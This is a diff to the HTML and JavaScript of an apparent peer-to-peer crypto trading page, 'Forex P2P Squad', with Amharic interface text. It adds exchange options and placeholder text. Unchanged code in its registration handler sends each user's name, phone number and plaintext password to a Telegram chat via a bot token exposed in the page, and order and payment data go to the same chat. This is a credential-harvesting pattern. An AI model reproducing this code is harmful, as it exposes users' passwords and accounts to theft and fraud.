@@ -120,8 +120,9 @@
                         <select id="crypto-platform" style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;" onchange="updateDynamicPlaceholder()">
                             <option value="binance">Binance (Pay ID / Email)</option>
                             <option value="mexc">MEXC (UID / Email)</option>
-                            <option value="paxful">Paxful (Username)</option>
-                            <option value="telegram_wallet">Telegram Wallet (Phone/Address)</option>
+                            <option value="bybit">Bybit (UID / Email / Phone)</option>
+                            <option value="bitget">Bitget (UID / Email / Phone)</option>
+                            <option value="gateio">Gate.io (UID / Email)</option>
                         </select>
                     </div>
 
@@ -191,13 +192,13 @@
         <div id="page-guide" class="page-section" style="display: none;">
             <section class="card">
                 <div class="card-title">📖 How to Trade</div>
-                <p style="color: #a0aec0; font-size: 0.9rem; line-height: 1.6;">በስልክ ቁጥርዎ አካውንት በመክፈት ይግቡ። የኔትወርክ ፊይ (Fee) ለመቀነስ የውስጥ ማስተላለፊያ ዘዴዎችን (Binance Pay, MEXC, Telegram) ይጠቀሙ።</p>
+                <p style="color: #a0aec0; font-size: 0.9rem; line-height: 1.6;">በስልክ ቁጥርዎ አካውንት በመክፈት ይግቡ። የኔትወርክ ፊይ (Fee) ለመቀነስ የውስጥ ማስተላለፊያ ዘዴዎችን (Binance Pay, MEXC, Bybit, Bitget, Gate.io) ይጠቀሙ።</p>
             </section>
         </div>
 
         <footer class="footer">
             <span>Forex P2P Squad © 2026</span>
-            <span>v3.1</span>
+            <span>v3.2</span>
         </footer>
     </div>
 
@@ -278,6 +279,7 @@
             calculatedETBGlobal = total;
         }
 
+        // ⚡ እንደ አዲሶቹ መድረኮች ምርጫ መግለጫዎቹን (Placeholders) በራስ-ሰር መቀየር
         function updateDynamicPlaceholder() {
             if (currentTradeType === 'sell') return;
             const platform = document.getElementById('crypto-platform').value;
@@ -286,8 +288,9 @@
 
             if(platform === 'binance') { label.innerText = "Your Binance Pay ID or Email"; input.placeholder = "e.g. 238492048 or email@gmail.com"; }
             else if(platform === 'mexc') { label.innerText = "Your MEXC UID or Email"; input.placeholder = "e.g. 83920482 or email@gmail.com"; }
-            else if(platform === 'paxful') { label.innerText = "Your Paxful Username"; input.placeholder = "e.g. PaxfulUser123"; }
-            else if(platform === 'telegram_wallet') { label.innerText = "Your Telegram Phone/Wallet Tag"; input.placeholder = "+2519... or @username"; }
+            else if(platform === 'bybit') { label.innerText = "Your Bybit UID, Email or Phone"; input.placeholder = "e.g. UID: 4810294 or email/phone"; }
+            else if(platform === 'bitget') { label.innerText = "Your Bitget UID, Email or Phone"; input.placeholder = "e.g. UID: 9283742 or email/phone"; }
+            else if(platform === 'gateio') { label.innerText = "Your Gate.io UID or Email"; input.placeholder = "e.g. UID: 1029384 or email@gmail.com"; }
         }
 
         function updateFileLabel(input) {
@@ -395,7 +398,7 @@
                         `💵 *ጠቅላላ ክፍያ:* ${calculatedETBGlobal.toLocaleString()} ETB\n` +
                         `🏦 *ክፍያ መንገድ:* ${method.toUpperCase()}\n` +
                         `📞 *የደንበኛ ስልክ:* ${phone}\n` +
-                        `🔑 *የመድረክ መፈላጊ:* \`${targetDestination}\``;
+                        `🔑 *የመድረክ መረጃ:* \`${targetDestination}\``;
 
             if (currentTradeType === 'sell' && sellFile) {
                 sendPhotoToTelegram(sellFile, msg, orderId, currentTradeType, amount, method, targetDestination);
@@ -422,7 +425,7 @@
             if(!file) return;
             
             fileInput.previousElementSibling.innerText = "✅ Sent: " + file.name;
-            const msg = `💵 *የክፍያ ማረጋገጫ ስክሪንሻት ደርሷል!*\n\n🆔 *Order ID:* \`${globalCurrentOrderId}\`\nደንበኛው ለአሚር/ሰሚር መክፈሉን የሚገልጽ ፎቶ ልኳል።`;
+            const msg = `💵 *የክፍያ ማረጋገጫ ስክሪንሻት ደርሷል!*\n\n🆔 *Order ID:* \`${globalCurrentOrderId}\`\nደንበኛው ለአድሚን መክፈሉን የሚገልጽ ፎቶ ልኳል።`;
             
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
@@ -467,7 +470,7 @@
             const msg = `📝 *አዲስ ተጠቃሚ ተመዝግቧል!*\n\n👤 *ስም:* ${name}\n📞 *ስልክ:* ${phone}\n🔑 *ይለፍ ቃል:* \`${pass}\``;
             isLoggedIn = true; loggedInUserPhone = phone; localStorage.setItem('currentUserPhone', phone); updateAuthHeader();
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" }) });
-            closeModal('register-modal'); showNotification("በተካሳ ሁኔታ ተመዝግበዋል!");
+            closeModal('register-modal'); showNotification("በተሳካ ሁኔታ ተመዝግበዋል!");
         }
 
         function handleLoginSubmit(event) {
